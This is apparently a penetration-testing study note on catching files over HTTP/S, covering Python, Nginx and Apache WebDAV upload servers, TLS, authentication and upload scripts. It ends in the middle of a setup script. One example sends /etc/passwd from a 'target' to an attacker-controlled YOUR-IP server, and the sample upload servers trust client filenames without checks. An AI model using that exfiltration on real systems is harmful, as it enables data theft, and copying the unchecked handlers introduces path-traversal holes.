---
tags: [module/file-transfers, http, https, nginx, apache, file-upload, webdav, ssl, automation, level/advanced, practical]
---

# Catching Files over HTTP/S - Practical Application

## Complete HTTP/S File Capture Workflow

Phase 1: Python HTTP Servers
Phase 2: Nginx PUT Configuration
Phase 3: Apache WebDAV Configuration
Phase 4: HTTPS with Self-Signed Certificates
Phase 5: Authentication
Phase 6: Upload Scripts
Phase 7: Automation

---

## Phase 1: Python HTTP Servers

### Basic HTTP Server (Download Only)

# Python 3
python3 -m http.server 8000

# Python 2
python2 -m SimpleHTTPServer 8000

# Specify different port and directory
cd /path/to/files && python3 -m http.server 8080

### Upload Server with Python

# Install
pip3 install uploadserver

# Basic upload server
python3 -m uploadserver

# Upload with custom port
python3 -m uploadserver 8080

# Upload file from target
curl -X POST http://YOUR-IP:8000/upload -F 'files=@/etc/passwd'

# Upload multiple files
curl -X POST http://YOUR-IP:8000/upload -F 'files=@file1' -F 'files=@file2'

### Custom Python Upload Server

Save as upload_server.py:

#!/usr/bin/env python3
import http.server
import cgi
import os
import ssl

class UploadHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        form = cgi.FieldStorage(
            fp=self.rfile,
            headers=self.headers,
            environ={'REQUEST_METHOD':'POST'}
        )
        for field in form.keys():
            if field.files:
                file_item = form[field]
                if file_item.filename:
                    with open(file_item.filename, 'wb') as f:
                        f.write(file_item.file.read())
                    self.send_response(200)
                    self.end_headers()
                    self.wfile.write(b'Upload successful')
                    return
        self.send_response(400)
        self.end_headers()
        self.wfile.write(b'No file uploaded')

    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'''
                <html><body>
                <form method="POST" enctype="multipart/form-data">
                <input type="file" name="file">
                <input type="submit">
                </form>
                </body></html>
            ''')
        else:
            super().do_GET()

# Run with HTTPS
httpd = http.server.HTTPServer(('0.0.0.0', 443), UploadHandler)
context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain('server.pem', 'server.key')
httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
httpd.serve_forever()

---

## Phase 2: Nginx PUT Configuration

### Complete Nginx Upload Setup

# Install Nginx
sudo apt install nginx -y

# Create upload directory
sudo mkdir -p /var/www/uploads
sudo chown -R www-data:www-data /var/www/uploads

# Create Nginx config
sudo nano /etc/nginx/sites-available/upload

server {
    listen 8080;
    
    # Enable logging
    access_log /var/log/nginx/upload_access.log;
    error_log /var/log/nginx/upload_error.log;
    
    location /uploads/ {
        alias /var/www/uploads/;
        dav_methods PUT;
        create_full_put_path on;
        dav_access user:rw group:rw all:r;
        
        # Limit file size
        client_max_body_size 100M;
        
        # Add headers
        add_header X-WebDAV-Status "enabled";
    }
    
    # Directory listing (disabled by default, but can be enabled)
    location /files/ {
        alias /var/www/uploads/;
        autoindex on;
        autoindex_exact_size off;
        autoindex_localtime on;
    }
}

# Enable site
sudo ln -s /etc/nginx/sites-available/upload /etc/nginx/sites-enabled/
sudo rm /etc/nginx/sites-enabled/default 2>/dev/null

# Test config
sudo nginx -t

# Restart Nginx
sudo systemctl restart nginx

### Upload Files with Different Tools

# Using curl
curl -T localfile.txt http://server:8080/uploads/remotefile.txt

# Using wget (PUT not supported)
# Using HTTPie
http PUT http://server:8080/uploads/file.txt < localfile.txt

# Using PowerShell (Windows)
$uri = "http://server:8080/uploads/file.txt"
$file = "C:\localfile.txt"
Invoke-WebRequest -Uri $uri -Method PUT -InFile $file

### Nginx with Authentication

# Create password file
sudo apt install apache2-utils -y
sudo htpasswd -c /etc/nginx/.htpasswd user1

# Update config
location /uploads/ {
    alias /var/www/uploads/;
    dav_methods PUT;
    auth_basic "Restricted Upload";
    auth_basic_user_file /etc/nginx/.htpasswd;
}

---

## Phase 3: Apache WebDAV Configuration

### Enable Apache Modules

sudo a2enmod dav dav_fs dav_lock auth_digest
sudo systemctl restart apache2

### Create WebDAV Directory

sudo mkdir -p /var/www/webdav
sudo chown -R www-data:www-data /var/www/webdav

### Create Password File

sudo htpasswd -c /etc/apache2/webdav.passwd user1

### Configure Apache WebDAV

sudo nano /etc/apache2/sites-available/webdav.conf

Alias /webdav /var/www/webdav

<Location /webdav>
    DAV On
    AuthType Basic
    AuthName "WebDAV"
    AuthUserFile /etc/apache2/webdav.passwd
    Require valid-user
    
    # Allow PUT, DELETE, etc.
    <LimitExcept GET HEAD OPTIONS>
        Require valid-user
    </LimitExcept>
</Location>

<Directory /var/www/webdav>
    Options Indexes MultiViews
    AllowOverride None
    Require all granted
</Directory>

# Enable site
sudo a2ensite webdav
sudo systemctl reload apache2

### Mount WebDAV on Windows

net use Z: http://server/webdav /user:user1

### Mount WebDAV on Linux

sudo apt install davfs2 -y
sudo mount -t davfs http://server/webdav /mnt/webdav

---

## Phase 4: HTTPS with Self-Signed Certificates

### Generate Self-Signed Certificate

# Generate private key and certificate
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

# Combine for some servers
cat key.pem cert.pem > server.pem

### Nginx HTTPS Configuration

server {
    listen 8443 ssl;
    server_name _;
    
    ssl_certificate /etc/nginx/ssl/cert.pem;
    ssl_certificate_key /etc/nginx/ssl/key.pem;
    
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;
    
    location /uploads/ {
        alias /var/www/uploads/;
        dav_methods PUT;
    }
}

### Python HTTPS Upload Server

# Generate cert first
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes

# Run HTTPS server
python3 -c "
import http.server, ssl
server = http.server.HTTPServer(('0.0.0.0', 443), http.server.SimpleHTTPRequestHandler)
server.socket = ssl.wrap_socket(server.socket, certfile='cert.pem', keyfile='key.pem', server_side=True)
server.serve_forever()
"

### Download with curl (ignore cert)

curl -k https://server:8443/uploads/file.txt -o file.txt

### Upload with curl (ignore cert)

curl -k -T localfile.txt https://server:8443/uploads/remotefile.txt

---

## Phase 5: Authentication

### Basic Authentication with Nginx

# Create password file
printf "user1:$(openssl passwd -apr1 StrongPassword)\n" > /etc/nginx/.htpasswd

# Nginx config
location /uploads/ {
    alias /var/www/uploads/;
    dav_methods PUT;
    auth_basic "Restricted Area";
    auth_basic_user_file /etc/nginx/.htpasswd;
}

### Upload with Authentication

curl -u user1:StrongPassword -T file.txt https://server/uploads/file.txt

### Token-Based Authentication

Custom Python server with token:

from http.server import HTTPServer, BaseHTTPRequestHandler
import cgi

TOKEN = "SecretToken123"

class AuthHandler(BaseHTTPRequestHandler):
    def do_PUT(self):
        if self.headers.get('X-Token') != TOKEN:
            self.send_response(401)
            self.end_headers()
            return
        
        content_length = int(self.headers['Content-Length'])
        filename = self.path.split('/')[-1]
        
        with open(filename, 'wb') as f:
            f.write(self.rfile.read(content_length))
        
        self.send_response(200)
        self.end_headers()

HTTPServer(('0.0.0.0', 8080), AuthHandler).serve_forever()

---

## Phase 6: Upload Scripts

### Python Upload Client

Save as upload_client.py:

#!/usr/bin/env python3
import requests
import sys
import os

def upload_file(url, filepath, auth=None):
    filename = os.path.basename(filepath)
    files = {'file': (filename, open(filepath, 'rb'))}
    
    if auth:
        response = requests.post(url, files=files, auth=auth)
    else:
        response = requests.post(url, files=files)
    
    if response.status_code == 200:
        print(f"[+] Uploaded {filename}")
    else:
        print(f"[-] Upload failed: {response.status_code}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <url> <file> [username:password]")
        sys.exit(1)
    
    url = sys.argv[1]
    filepath = sys.argv[2]
    auth = None
    
    if len(sys.argv) > 3:
        username, password = sys.argv[3].split(':')
        auth = (username, password)
    
    upload_file(url, filepath, auth)

### PowerShell Upload Script

Save as Upload-File.ps1:

param(
    [string]$Url,
    [string]$FilePath,
    [string]$Username,
    [string]$Password
)

$fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
$base64 = [System.Convert]::ToBase64String($fileBytes)

$body = @{
    filename = (Split-Path $FilePath -Leaf)
    file = $base64
} | ConvertTo-Json

$headers = @{}
if ($Username -and $Password) {
    $pair = "${Username}:${Password}"
    $bytes = [System.Text.Encoding]::ASCII.GetBytes($pair)
    $base64 = [System.Convert]::ToBase64String($bytes)
    $headers['Authorization'] = "Basic $base64"
}

Invoke-RestMethod -Uri $Url -Method Post -Body $body -ContentType "application/json" -Headers $headers

---

## Phase 7: Automation

### Complete Upload Server Setup Script

Save as setup-upload-server.sh:

#!/bin/bash
# Automated Nginx upload server setup

PORT=${1:-8080}
UPLOAD_DIR="/var/www/uploads"
CONF_FILE="/etc/nginx/sites-available/upload"

# Install Nginx
sudo apt update
sudo apt install nginx apache2-utils -y

# Create upload directory
sudo mkdir -p "$UPLOAD_DIR"
sudo chown -R www-data:www-data "$UPLOAD_DIR"

# Create password (optional)
read -p "Add authentication? (y/n): " add_auth
if [ "$add_auth" == "y" ]; then
    read -p "Username: " username
    sudo htpasswd -c /etc/nginx/.htpasswd "$username"
    AUTH_CONFIG="
        auth_basic \"Restricted Upload\";
        auth_basic_user_file /etc/nginx/.htpasswd;"
else
    AUTH_CONFIG=""
fi

# Create Nginx config
sudo tee "$CONF_FILE" > /dev/null <<EOF
server {
    listen $PORT;
    
    access_log /var/log/nginx/upload_access.log;
    error_log /var/log/nginx/upload_error.log;
    
    location /uploads/ {
        alias $UPLOAD_DIR/;
        dav_methods PUT;
        create_full_put_path on;
        client_max_body_size 100M;
        $AUTH_CONFIG
    }
}
